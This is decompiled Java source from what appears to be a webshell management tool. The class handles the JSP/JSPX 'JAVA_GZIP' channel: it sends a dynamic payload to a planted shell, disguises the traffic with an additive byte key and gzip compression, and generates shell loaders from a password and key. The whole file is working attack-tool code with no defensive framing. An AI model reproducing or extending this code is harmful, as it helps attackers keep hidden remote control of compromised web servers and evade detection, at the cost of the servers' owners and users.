//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.JavaAes;

import core.annotation.CryptionAnnotation;
import core.annotation.PropertyAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.crypto.Cipher;
import shells.channel.HttpRequestChannel;
import shells.channel.RequestChannel;
import util.Log;
import util.functions;

@CryptionAnnotation(
    Name = "JAVA_GZIP",
    payloadName = "JavaDynamicPayload"
)
public class JavaGzip implements Cryption {
    private ShellEntity shell;
    private RequestChannel request;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    @PropertyAnnotation(
        Name = "suffix",
        Value = "jsp;jspx;"
    )
    private String suffix;

    public JavaGzip() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.request = new HttpRequestChannel(context);
        context.setRequest(this.request);
        this.key = this.shell.getSecretKeyX();

        try {
            this.payload = this.shell.getPayloadModule().getPayload();
            this.shell.putHeader("Content-Type", "application/octet-stream");
            if (this.payload != null) {
                this.request.sendRequest(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var3) {
            Log.error(var3);
        }
    }

    public synchronized byte[] encode(byte[] data) {
        try {
            return code(data, this.key.getBytes(), true);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public synchronized byte[] decode(byte[] data) {
        try {
            return code(data, this.key.getBytes(), false);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public static byte[] code(byte[] data, byte[] key, boolean isEncode) throws Exception {
        byte[] processData = isEncode ? data : gzipDecompress(data);
        byte[] resultBytes = new byte[processData.length];

        for(int i = 0; i < processData.length; ++i) {
            int keyIndex = i % key.length;
            resultBytes[i] = (byte)(((processData[i] & 255) + (isEncode ? 1 : -1) * (key[keyIndex] & 255)) % 256);
        }

        return isEncode ? gzipCompress(resultBytes) : resultBytes;
    }

    private static byte[] gzipCompress(byte[] data) throws Exception {
        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
        GZIPOutputStream gzipStream = new GZIPOutputStream(byteStream);
        Throwable var3 = null;

        try {
            gzipStream.write(data);
        } catch (Throwable var12) {
            var3 = var12;
            throw var12;
        } finally {
            if (gzipStream != null) {
                if (var3 != null) {
                    try {
                        gzipStream.close();
                    } catch (Throwable var11) {
                        var3.addSuppressed(var11);
                    }
                } else {
                    gzipStream.close();
                }
            }

        }

        return byteStream.toByteArray();
    }

    private static byte[] gzipDecompress(byte[] data) throws Exception {
        ByteArrayInputStream byteStream = new ByteArrayInputStream(data);
        ByteArrayOutputStream outStream = new ByteArrayOutputStream();
        GZIPInputStream gzipStream = new GZIPInputStream(byteStream);
        Throwable var4 = null;

        try {
            byte[] buffer = new byte[1024];

            int len;
            while((len = gzipStream.read(buffer)) > 0) {
                outStream.write(buffer, 0, len);
            }
        } catch (Throwable var14) {
            var4 = var14;
            throw var14;
        } finally {
            if (gzipStream != null) {
                if (var4 != null) {
                    try {
                        gzipStream.close();
                    } catch (Throwable var13) {
                        var4.addSuppressed(var13);
                    }
                } else {
                    gzipStream.close();
                }
            }

        }

        return outStream.toByteArray();
    }

    public boolean isSendRLData() {
        return false;
    }

    public boolean check() {
        return this.state;
    }

    public String getSuffix() {
        return this.suffix;
    }

    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(this.suffix, password, functions.md5(secretKey).substring(0, 16), "gzip");
    }
}
